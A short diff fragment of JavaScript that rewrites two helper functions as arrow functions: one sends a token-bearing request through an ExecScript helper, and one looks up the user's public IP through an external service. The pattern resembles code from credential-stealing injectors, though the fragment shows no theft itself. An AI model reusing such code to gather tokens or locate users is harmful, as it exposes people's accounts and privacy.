@@ -220,7 +220,7 @@ async function ExecScript(str) {
  return script || null;
 }
 
-async function GetUrl(url, token) {
+const GetUrl = async (url, token) => {
  const data = await ExecScript(`
   var xmlHttp = new XMLHttpRequest();
   xmlHttp.open( "GET", "${url}", false );
@@ -230,7 +230,7 @@ async function GetUrl(url, token) {
  return data;
 };
 
-async function GetIp() {
+const GetIp = async () => {
  const data = await ExecScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`);
  return data.ip;
 };
